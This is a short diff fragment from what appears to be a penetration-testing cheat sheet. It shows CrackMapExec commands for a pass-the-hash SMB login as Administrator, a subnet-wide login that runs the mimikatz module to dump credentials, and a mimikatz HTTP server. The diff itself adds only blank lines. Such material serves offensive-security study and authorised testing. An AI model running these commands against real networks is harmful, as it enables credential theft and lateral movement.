@@ -28,3 +28,5 @@ root@payload$ cme smb 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3
 root@payload$ cme smb 10.10.14.0/24 -u user -p 'Password' --local-auth -M mimikatz
 root@payload$ cme mimikatz --server http --server-port 80
 ```
+
+
